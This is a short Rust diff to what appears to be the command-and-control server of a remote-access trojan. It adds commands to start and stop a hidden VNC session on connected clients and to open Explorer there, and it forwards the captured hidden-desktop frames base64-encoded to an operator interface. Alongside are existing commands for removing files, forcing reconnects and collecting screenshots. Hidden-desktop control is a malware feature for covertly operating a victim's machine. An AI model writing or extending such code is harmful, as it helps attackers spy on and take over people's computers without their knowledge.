@@ -226,6 +226,18 @@ impl ServerWrapper {
                 RemoveFile(addr, path) => self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path)).await,
                 DisconnectClient(addr) => self.send_client_packet(&addr, ClientboundPacket::Disconnect).await,
                 ReconnectClient(addr) => self.send_client_packet(&addr, ClientboundPacket::Reconnect).await,
+
+                StartHVNC(addr) => self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await,
+                StopHVNC(addr) => self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await,
+                OpenExplorer(addr) => self.send_client_packet(&addr, ClientboundPacket::OpenExplorer).await,
+
+                HVNCFrame(addr, data) => {
+                    println!("HVNCFrame received from {}", addr);
+                    self.emit_serde_payload("hvnc_frame", serde_json::json!({
+                        "addr": addr.to_string(),
+                        "data": general_purpose::STANDARD.encode(&data)
+                    })).await;
+                }
                 
                 // Client data responses - consolidated pattern
                 ScreenshotData(addr, data) => {
